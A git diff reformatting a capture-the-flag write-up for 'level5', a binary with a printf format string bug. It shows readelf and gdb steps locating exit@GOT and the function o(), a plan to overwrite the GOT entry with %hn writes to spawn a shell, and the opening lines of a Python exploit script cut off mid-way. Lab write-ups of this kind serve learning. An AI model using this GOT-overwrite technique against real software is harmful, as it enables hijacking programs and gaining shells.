@@ -1,11 +1,6 @@
-LEVEL_5:
-# 📚 Exploiting `level5` – Format String Vulnerability
-```
-$ ./level5
-test
-test
-$
-```
+<h1 align="center"> LEVEL 5 </h1>
+
+## 🔍 Analysis of Decompiled [level5](./source.c)
 ```
 void o(void)
 {
@@ -33,21 +28,21 @@ void main(void)
 ```
 ## What happens?
 
-The program reads input via fgets() into a large buffer (local_20c).</br>
-Then it calls printf(local_20c); — format string vulnerability!</br>
-Finally, it calls exit(1);
+- The program reads input via fgets() into a large buffer (local_20c).
+- Then it calls printf(local_20c); — format string vulnerability!
+- Finally, it calls exit(1);
 
-## Goal
+## 💥 Exploit 
 Use the format string vulnerability in printf(local_20c) to overwrite a GOT entry so when exit(1) is called, it actually calls o() instead of the normal exit().
-## Step 1: Identify the GOT entry for exit
+### Step 1: Identify the GOT entry for exit
 ```
 $ readelf -r ./level5 | grep exit
 08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
 08049838  00000607 R_386_JUMP_SLOT   00000000   exit
 
 ```
-So, exit@GOT is at 0x08049838 
-## Step 2: Find the address of o()
+So, exit@GOT is at `0x08049838` 
+### Step 2: Find the address of o()
 ```
 $ gdb ./level5
 (gdb) info fucntions
@@ -58,21 +53,20 @@ $ gdb ./level5
 ...
 
 ```
-so the address of o is 0x080484a4
+so the address of o is `0x080484a4`
 
-## Step 3: Exploit with format string
+### Step 3: Exploit with format string
 
 Use the format string vulnerability to write the address of o() into exit@GOT.</br>
 When n() calls exit(1), the program actually jumps to o(), spawning a shell.
 
 How to write the address?
+- Split o() address into two halves (low 2 bytes and high 2 bytes).
+- Write these halves to exit@GOT and exit@GOT + 2 using %hn.
+- Use format string to print enough characters for padding.
 
-    Split o() address into two halves (low 2 bytes and high 2 bytes).
-    Write these halves to exit@GOT and exit@GOT + 2 using %hn.
-    Use format string to print enough characters for padding.
-
-exploit script using python
-```
+exploit script using python:
+```py
 import struct
 
 ret_addr = 0x08049838
